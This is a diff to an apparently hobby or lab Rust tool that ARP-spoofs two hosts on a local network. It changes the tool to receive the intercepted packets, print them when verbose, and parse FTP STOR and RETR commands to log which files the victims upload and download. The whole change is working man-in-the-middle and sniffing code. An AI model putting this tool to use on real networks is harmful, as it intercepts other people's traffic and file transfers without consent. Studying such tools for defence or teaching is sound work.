@@ -2,7 +2,15 @@ mod arp;
 
 use anyhow::{anyhow, Result};
 use clap::Parser;
-use pnet::{datalink::interfaces, packet::Packet, util::MacAddr};
+use pnet::{
+    datalink::interfaces,
+    packet::{
+        arp::ArpPacket,
+        ethernet::{EtherTypes, EthernetPacket},
+        Packet,
+    },
+    util::MacAddr,
+};
 use std::{
     io,
     net::Ipv4Addr,
@@ -26,6 +34,8 @@ pub struct Args {
     pub tip: Ipv4Addr,
     #[clap(value_name = "target mac")]
     pub tmac: MacAddr,
+    #[clap(short, long, help = "prints more information, like full packet data")]
+    pub verbose: bool,
 }
 
 fn main() -> Result<()> {
@@ -46,30 +56,59 @@ fn main() -> Result<()> {
     client.spoof((args.sip, args.smac), (args.tip, args.tmac))?;
     println!(" done.");
     while !ctrlc.load(Ordering::Relaxed) {
-        println!("receiving...");
         client.spoof((args.sip, args.smac), (args.tip, args.tmac))?;
-        // let data = match client.recv() {
-        //     Ok(data) => data,
-        //     Err(e) => {
-        //         // ignore interrupted errors (ctrl-c)
-        //         if let Some(e) = e.downcast_ref::<std::io::Error>() {
-        //             if e.kind() == io::ErrorKind::Interrupted {
-        //                 continue;
-        //             }
-        //         };
-        //         println!("failed to receive packet: {}", e);
-        //         continue;
-        //     }
-        // };
-        // println!(
-        //     "received packet: {:?}. payload: {:500?}",
-        //     data,
-        //     String::from_utf8_lossy(data.payload())
-        // );
-        thread::sleep(Duration::from_secs(1));
+        let data = match client.recv() {
+            Ok(data) => data,
+            Err(e) => {
+                // ignore interrupted errors (ctrl-c)
+                if let Some(e) = e.downcast_ref::<std::io::Error>() {
+                    if e.kind() == io::ErrorKind::Interrupted || e.kind() == io::ErrorKind::TimedOut
+                    {
+                        continue;
+                    }
+                };
+                println!("failed to receive packet: {}", e);
+                continue;
+            }
+        };
+        if args.verbose {
+            println!(
+                "received packet: {:?}.\npayload: {:?}",
+                data,
+                String::from_utf8_lossy(data.payload())
+            );
+        }
+        _ = ftp_handle(data);
     }
     print!("unspoofing...");
     client.unspoof((args.sip, args.smac), (args.tip, args.tmac))?;
     println!(" done.");
+    Ok(())
+}
+
+pub fn ftp_handle(p: EthernetPacket) -> Result<()> {
+    if p.get_ethertype() != EtherTypes::Ipv4 {
+        return Err(anyhow!("packet is not ipv4"));
+    }
+    let payload = p.payload();
+    let viewable_payload = payload
+        .iter()
+        .filter_map(|&b| {
+            let c = b as char;
+            if c.is_ascii_graphic() || c == ' ' || c == ';' {
+                return Some(c);
+            }
+            None
+        })
+        .collect::<String>();
+    if let Some(i) = viewable_payload.find("STOR") {
+        let filename = &viewable_payload[i + 4..];
+        println!("sending {filename}");
+    } else if let Some(i) = viewable_payload.find("RETR") {
+        let filename = &viewable_payload[i + 4..];
+        println!("receiving {filename}");
+    } else {
+        return Err(anyhow!("no STOR or RETR found"));
+    }
     Ok(())
 }
